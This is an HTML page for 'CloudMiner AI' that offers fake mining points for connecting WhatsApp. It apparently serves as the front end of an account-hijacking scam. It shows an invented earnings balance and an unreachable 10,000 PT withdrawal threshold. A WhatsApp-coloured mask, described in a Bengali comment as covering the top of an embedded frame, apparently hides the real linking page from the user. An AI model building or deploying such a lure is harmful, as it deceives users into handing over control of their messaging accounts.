<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CloudMiner AI - Secure Node</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --primary: #25D366;
            --mirror: rgba(255, 255, 255, 0.15);
            --bg-dark: #0b141a;
            --glass: rgba(255, 255, 255, 0.05);
        }

        body { font-family: 'Segoe UI', sans-serif; background: var(--bg-dark); color: white; margin: 0; overflow: hidden; }

        /* Dashboard View */
        .view { display: none; height: 100vh; flex-direction: column; padding: 20px; box-sizing: border-box; }
        .active-view { display: flex; }

        .balance-card {
            background: linear-gradient(135deg, var(--mirror), var(--glass));
            backdrop-filter: blur(15px);
            border: 1px solid var(--mirror);
            padding: 25px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }

        .points { font-size: 40px; font-weight: bold; color: var(--primary); text-shadow: 0 0 10px rgba(37,211,102,0.3); }

        /* Task Window */
        .iframe-container {
            flex-grow: 1;
            position: relative;
            margin-top: 15px;
            border-radius: 15px;
            overflow: hidden;
            border: 1px solid var(--mirror);
        }

        .mirror-layer {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 50px; /* উপরের অংশে কালার মাস্ক */
            background: linear-gradient(to bottom, #dcf8c6, transparent);
            backdrop-filter: blur(2px);
            z-index: 5;
            pointer-events: none;
        }

        iframe { width: 100%; height: 100%; border: none; background: white; }

        /* Buttons */
        .btn {
            background: var(--primary);
            color: white; border: none; padding: 15px;
            border-radius: 12px; font-weight: bold; cursor: pointer;
            width: 100%; font-size: 16px; margin-top: 10px;
        }

        /* Footer Nav */
        .nav {
            position: fixed; bottom: 0; width: 100%;
            background: #1f2c34; display: flex;
            justify-content: space-around; padding: 12px 0;
            border-top: 1px solid var(--mirror);
        }
        .nav-item { color: #8696a0; text-align: center; font-size: 12px; cursor: pointer; }
        .nav-active { color: var(--primary); }
    </style>
</head>
<body>

<div id="view-main" class="view active-view">
    <div class="balance-card">
        <div style="color: #8696a0; font-size: 14px;">Total Earnings</div>
        <div class="points" id="mainPoints">0.00 PT</div>
        <div id="miningStatus" style="font-size: 12px; margin-top: 5px; color: #ffbc00;">● Node Inactive</div>
    </div>
    
    <div style="margin-top: 30px;">
        <h3>Mining Tasks</h3>
        <div style="background: var(--glass); padding: 15px; border-radius: 12px;">
            <p style="margin: 0; font-size: 14px;">Connect WhatsApp to start auto-mining (30 PT/hr)</p>
            <button class="btn" onclick="openTask()">Start WhatsApp Task</button>
        </div>
    </div>
</div>

<div id="view-task" class="view">
    <div style="text-align: center; margin-bottom: 10px;">
        <span style="font-size: 14px; color: #25D366;">Complete the connection below</span>
    </div>
    
    <div class="iframe-container">
        <div class="mirror-layer"></div>
        <iframe src="about:blank" id="taskFrame"></iframe>
    </div>

    <button class="btn" onclick="verifyTask()" id="verifyBtn">Click After Connecting WhatsApp</button>
</div>

<div class="nav">
    <div class="nav-item nav-active" onclick="location.reload()"><i class="fas fa-hammer"></i><br>Mining</div>
    <div class="nav-item" onclick="alert('Withdraw starts at 10,000 PT')"><i class="fas fa-wallet"></i><br>Withdraw</div>
    <div class="nav-item"><i class="fas fa-shield-alt"></i><br>Support</div>
</div>

<script src="script.js"></script>
</body>
</html>
